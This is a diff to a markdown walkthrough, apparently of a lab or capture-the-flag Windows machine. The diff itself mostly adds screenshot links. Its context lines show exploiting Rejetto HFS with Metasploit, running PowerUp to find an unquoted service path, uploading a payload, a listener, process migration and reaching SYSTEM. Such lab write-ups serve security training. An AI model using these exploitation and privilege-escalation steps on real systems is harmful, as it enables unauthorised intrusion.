@@ -41,6 +41,8 @@ LHOST => 192.168.234.6
 
 msf exploit(windows/http/rejetto_hfs_exec) > run`
 
+![image](images/mfsconsole.png)
+
 After successful exploitation, we receive a Meterpreter session.
 
 <h3>User Flag</h3>
@@ -52,6 +54,8 @@ The user flag is located on Bill's desktop.
 Read the flag:
 
 `cat user.txt`
+
+![image](images/mfsconsole.png)
 
 <h3>Privilege Escalation Enumeration</h3>
 
@@ -87,10 +91,11 @@ Import the script:
 
 `PS > . .\PowerUp.ps1`
 
+![image](images/powerup.png)
+
 Run all checks:
 
 `PS > Invoke-AllChecks`
-
 
 
 <h3>Unquoted Service Path Vulnerability</h3>
@@ -159,7 +164,7 @@ Successful upload:
 
 `[*] Uploaded 15.50 KiB of 15.50 KiB (100.0%)`
 
-![image](images/Screenshot3.png)
+
 
 <h3>Setting Up the Listener</h3>
 
@@ -205,6 +210,8 @@ Example output:
 [*] Migrating into 3240
 [+] Successfully migrated into process 3240`
 
+![image](images/migrate.png)
+
 <h3>SYSTEM Access</h3>
 
 Verify the system information:
@@ -218,6 +225,8 @@ Check the current user:
 Result:
 
 `Server username: NT AUTHORITY\SYSTEM`
+
+![image](images/authority.png)
 
 We now have SYSTEM privileges.
 
